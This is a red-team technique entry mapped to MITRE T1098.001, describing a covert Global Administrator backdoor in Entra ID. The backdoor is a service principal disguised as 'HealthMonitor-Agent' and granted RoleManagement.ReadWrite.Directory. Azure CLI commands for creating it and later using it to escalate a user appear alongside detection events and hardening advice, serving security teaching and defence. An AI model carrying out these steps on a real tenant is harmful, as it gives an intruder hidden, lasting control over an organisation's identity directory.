# [PE-ACCTMGMT-014]: Global Administrator Backdoor (Service Principal)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ACCTMGMT-014 |
| **MITRE ATT&CK v18.1** | [Account Manipulation: Additional Cloud Credentials (T1098.001)](https://attack.mitre.org/techniques/T1098/001/) |
| **Tactic** | Persistence / Privilege Escalation |
| **Platforms** | Entra ID |
| **Severity** | **Critical** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Creating a standard user backdoor is risky because it appears in the "Global Administrators" list. A stealthier method is to create an App Registration (Service Principal) and grant it the `RoleManagement.ReadWrite.Directory` application permission. This permission allows the SP to grant *any* role (including Global Admin) to *any* user (including itself or a new attacker user). Service Principals are often overlooked in user audits.
- **Attack Surface:** Directory Roles.
- **Business Impact:** **Invisible God Mode**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Global Administrator (to set up initially).
- **Tools:**
    - Azure CLI

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Create App**
```bash
az ad app create --display-name "HealthMonitor-Agent"
```

**Step 2: Assign Permissions**
Grant `RoleManagement.ReadWrite.Directory`.
```bash
az ad app permission add --id <AppID> --api 00000003-0000-0000-c000-000000000000 --api-permissions 9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8=Role # RoleManagement.ReadWrite.Directory
az ad app permission grant --id <AppID> --consent-type AllPrincipals
```

**Step 3: Usage (When Needed)**
Log in as SP and make a user Global Admin.
```bash
az ad directory role member add --member-id <UserObjectID> --role "Global Administrator"
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **AuditLogs** | `Add app role assignment` | Granting `RoleManagement.ReadWrite.Directory` to a Service Principal. |
| **Directory** | `Add member to role` | A Service Principal adding members to the "Global Administrator" role. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Audit Permissions:** Regularly audit all Application Permissions. Flag any app with `RoleManagement` or `AppRoleAssignment` rights.
*   **Tiering:** Treat these Service Principals as Tier 0 assets.

## 7. ATTACK CHAIN
> **Preceding Technique:** [PE-ACCTMGMT-001]
> **Next Logical Step:** [PE-VALID-011]
